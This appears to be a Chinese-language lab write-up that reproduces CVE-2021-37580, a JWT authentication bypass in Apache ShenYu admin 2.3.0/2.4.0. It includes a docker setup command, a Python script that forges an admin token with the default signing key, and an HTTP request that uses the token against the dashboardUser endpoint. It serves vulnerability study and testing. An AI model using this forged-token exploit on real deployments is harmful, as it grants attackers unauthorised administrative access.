# Apache ShenYu 网关JWT认证绕过漏洞 CVE-2021-37580

Apache ShenYu是一个异步的，高性能的，跨语言的，响应式的API网关，Apache ShenYu功能十分强大且易于扩展，支持各种语言的http协议，同时支持Dubbo、 Spring Cloud、 gRPC、 Motan、 Sofa、 Tars 等协议。2021年11月，Apache ShenYu被爆出存在身份认证绕过漏洞，攻击者可以通过该漏洞绕过JWT(JSON Web Token)安全认证机制，直接进入系统后台。

影响版本：

Apache ShenYu 2.3.0
Apache ShenYu 2.4.0

项目地址

https://github.com/apache/shenyu

## 漏洞环境

执行如下命令启动一个shenyu-admin:2.4.0

```
sudo docker run -d -p 9095:9095 apache/shenyu-admin:2.4.0
```

![image-20250117145911299](./1.png)

## 漏洞复现

运行生成jwt token的python脚本（salt为JWT加密的密钥）

```python
import time
from jwt import PyJWT

if __name__ == "__main__":
    headers = {
        "alg": "HS256",
        "typ": "JWT"
    }
    salt = "2095132720951327"
    exp = int(time.time())
    payload = {
        "userName": 'admin',
        "exp": exp
    }
    token = PyJWT().encode(payload=payload, key=salt,algorithm='HS256', headers=headers)
    print(token)
```

![image-20250117150507644](./2.png)

携带上X-Access-Token 访问dashboardUser接口

```
GET /dashboardUser HTTP/1.1
Host: 192.168.27.128:9095
Accept-Encoding: gzip, deflate, br
Accept: */*
X-Access-Token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyTmFtZSI6ImFkbWluIiwiZXhwIjoxNzM3MDk3MjkwfQ.hEgBD9S8a0MNVNRx9ZoQ3QGHb5LpKK9P79cQKVp8urA
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36
Connection: close
Cache-Control: max-age=0


```

![image-20250117150632406](./3.png)